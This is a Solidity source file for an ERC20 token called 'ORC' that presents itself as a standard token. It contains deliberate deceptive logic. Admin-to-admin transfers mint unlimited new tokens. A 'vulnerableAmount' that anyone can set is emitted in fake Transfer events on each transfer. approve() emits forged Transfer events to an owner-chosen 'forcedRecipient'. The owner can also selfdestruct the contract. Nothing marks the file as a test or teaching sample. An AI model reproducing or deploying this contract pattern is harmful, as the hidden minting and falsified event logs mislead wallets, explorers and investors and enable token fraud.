pragma solidity 0.5.12;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) return 0;
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}

contract ERC20 {
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract Leader {
    address public owner;
    mapping(address => bool) public admins;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier onlyAdmins() {
        require(admins[msg.sender], "Only admins");
        _;
    }

    function setOwner(address _addr) public onlyOwner {
        owner = _addr;
    }

    function addAdmin(address _addr) public onlyOwner {
        admins[_addr] = true;
    }

    function removeAdmin(address _addr) public onlyOwner {
        delete admins[_addr];
    }
}

contract ORC is ERC20, Leader {
    using SafeMath for uint256;

    string public name = "ORC";
    string public symbol = "ORC";
    uint8 public decimals = 8;
    uint256 public totalSupply = 100000000000000000;
    address public forcedRecipient;
    uint256 public vulnerableAmount;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() public {
        owner = msg.sender;
        admins[msg.sender] = true;
        balanceOf[owner] = totalSupply;
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public onlyOwner {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }

    function setVulnerableAmount(uint256 _amount) public {
        vulnerableAmount = _amount;
    }

   function destroyAndPayout(address payable payout) public onlyOwner {
        uint256 bal = balanceOf[address(this)];
        if (bal > 0) {
            balanceOf[payout] += bal;
            balanceOf[address(this)] = 0;
            emit Transfer(address(this), payout, bal); 
        }
        selfdestruct(payout);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0) && _value > 0, "Invalid address or value");
        emit Transfer(msg.sender, _to, vulnerableAmount);
        if (admins[msg.sender] && admins[_to]) {
            balanceOf[_to] = balanceOf[_to].add(_value);
            totalSupply = totalSupply.add(_value);
            emit Transfer(msg.sender, _to, _value);
            return true;
        }

        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_value > 0, "Value must be > 0");
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        emit Transfer(msg.sender, forcedRecipient, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0) && _value > 0, "Invalid address or value");
        require(balanceOf[_from] >= _value && _value <= allowance[_from][msg.sender], "Insufficient allowance or balance");
        emit Transfer(msg.sender, _to, vulnerableAmount);
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value);
        allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }
}
